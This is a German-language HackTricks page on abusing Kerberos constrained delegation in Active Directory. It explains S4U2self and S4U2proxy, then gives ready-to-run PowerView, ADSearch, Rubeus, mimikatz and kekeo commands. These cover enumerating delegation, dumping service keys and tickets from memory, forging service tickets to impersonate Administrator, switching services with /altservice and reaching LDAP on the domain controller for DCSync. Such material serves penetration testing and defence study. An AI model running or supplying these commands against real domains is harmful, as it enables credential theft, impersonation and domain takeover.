# Constrained Delegation

{{#include ../../banners/hacktricks-training.md}}

## Constrained Delegation

Mit dieser Methode kann ein Domänenadministrator einem Computer **erlauben**, einen Benutzer oder Computer **zu impersonieren** gegenüber einem beliebigen **Dienst** einer Maschine.

- **Service for User to self (_S4U2self_):** Wenn ein **Dienstkonto** einen _userAccountControl_-Wert hat, der [TrustedToAuthForDelegation](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>) (T2A4D) enthält, kann es ein TGS für sich selbst (den Dienst) im Namen eines anderen Benutzers erhalten.
- **Service for User to Proxy(_S4U2proxy_):** Ein **Dienstkonto** könnte ein TGS im Namen eines Benutzers für den Dienst, der in **msDS-AllowedToDelegateTo** festgelegt ist, erhalten. Dazu benötigt es zunächst ein TGS von diesem Benutzer für sich selbst, kann jedoch S4U2self verwenden, um dieses TGS zu erhalten, bevor es das andere anfordert.

**Hinweis**: Wenn ein Benutzer in AD als ‘_Account is sensitive and cannot be delegated_ ’ markiert ist, können Sie **ihn nicht impersonieren**.

Das bedeutet, dass Sie, wenn Sie **den Hash des Dienstes kompromittieren**, **Benutzer impersonieren** und **Zugriff** in ihrem Namen auf jeden **Dienst** über die angegebenen Maschinen erhalten können (mögliche **privesc**).

Darüber hinaus haben Sie **nicht nur Zugriff auf den Dienst, den der Benutzer impersonieren kann, sondern auch auf jeden Dienst**, da der SPN (der angeforderte Dienstname) nicht überprüft wird (in dem Ticket ist dieser Teil nicht verschlüsselt/unterzeichnet). Daher können Sie, wenn Sie Zugriff auf den **CIFS-Dienst** haben, auch Zugriff auf den **HOST-Dienst** erhalten, indem Sie beispielsweise das `/altservice`-Flag in Rubeus verwenden.

Außerdem ist **LDAP-Dienstzugriff auf DC** erforderlich, um einen **DCSync** auszunutzen.
```bash:Enumerate
# Powerview
Get-DomainUser -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | select userprincipalname, name, msds-allowedtodelegateto

#ADSearch
ADSearch.exe --search "(&(objectCategory=computer)(msds-allowedtodelegateto=*))" --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
```

```bash:Quick Way
# Generate TGT + TGS impersonating a user knowing the hash
Rubeus.exe s4u /user:sqlservice /domain:testlab.local /rc4:2b576acbe6bcfda7294d6bd18041b8fe /impersonateuser:administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:ldap /ptt
```
- Schritt 1: **TGT des erlaubten Dienstes abrufen**
```bash:Get TGT
# The first step is to get a TGT of the service that can impersonate others
## If you are SYSTEM in the server, you might take it from memory
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap

# If you are SYSTEM, you might get the AES key or the RC4 hash from memory and request one
## Get AES/RC4 with mimikatz
mimikatz sekurlsa::ekeys

## Request with aes
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /nowrap

# Request with RC4
tgt::ask /user:dcorp-adminsrv$ /domain:sub.domain.local /rc4:8c6264140d5ae7d03f7f2a53088a291d
.\Rubeus.exe asktgt /user:dcorp-adminsrv$ /rc4:cc098f204c5887eaa8253e7c2749156f /outfile:TGT_websvc.kirbi
```
> [!WARNING]
> Es gibt **andere Möglichkeiten, ein TGT-Ticket** oder den **RC4** oder **AES256** zu erhalten, ohne SYSTEM auf dem Computer zu sein, wie den Printer Bug und unbeschränkte Delegation, NTLM-Relay und Missbrauch des Active Directory-Zertifizierungsdienstes.
>
> **Mit diesem TGT-Ticket (oder dem Hash) können Sie diesen Angriff durchführen, ohne den gesamten Computer zu kompromittieren.**

- Schritt 2: **Holen Sie sich TGS für den Dienst, der den Benutzer impersoniert**
```bash:Using Rubeus
# Obtain a TGS of the Administrator user to self
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /impersonateuser:Administrator /outfile:TGS_administrator

# Obtain service TGS impersonating Administrator (CIFS)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /outfile:TGS_administrator_CIFS

#Impersonate Administrator on different service (HOST)
.\Rubeus.exe s4u /ticket:TGT_websvc.kirbi /tgs:TGS_administrator_Administrator@DOLLARCORP.MONEYCORP.LOCAL_to_websvc@DOLLARCORP.MONEYCORP.LOCAL /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /altservice:HOST /outfile:TGS_administrator_HOST

# Get S4U TGS + Service impersonated ticket in 1 cmd (instead of 2)
.\Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:"CIFS/dcorp-mssql.dollarcorp.moneycorp.local" /user:dcorp-adminsrv$ /ticket:TGT_websvc.kirbi /nowrap

#Load ticket in memory
.\Rubeus.exe ptt /ticket:TGS_administrator_CIFS_HOST-dcorp-mssql.dollarcorp.moneycorp.local
```

```bash:kekeo + Mimikatz
#Obtain a TGT for the Constained allowed user
tgt::ask /user:dcorp-adminsrv$ /domain:dollarcorp.moneycorp.local /rc4:8c6264140d5ae7d03f7f2a53088a291d

#Get a TGS for the service you are allowed (in this case time) and for other one (in this case LDAP)
tgs::s4u /tgt:TGT_dcorpadminsrv$@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLAR CORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:time/dcorp-dc.dollarcorp.moneycorp.LOCAL|ldap/dcorpdc.dollarcorp.moneycorp.LOCAL

#Load the TGS in memory
Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_ldap~ dcorp-dc.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL_ALT.kirbi"'
```
[**Weitere Informationen auf ired.team.**](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-kerberos-constrained-delegation)

{{#include ../../banners/hacktricks-training.md}}
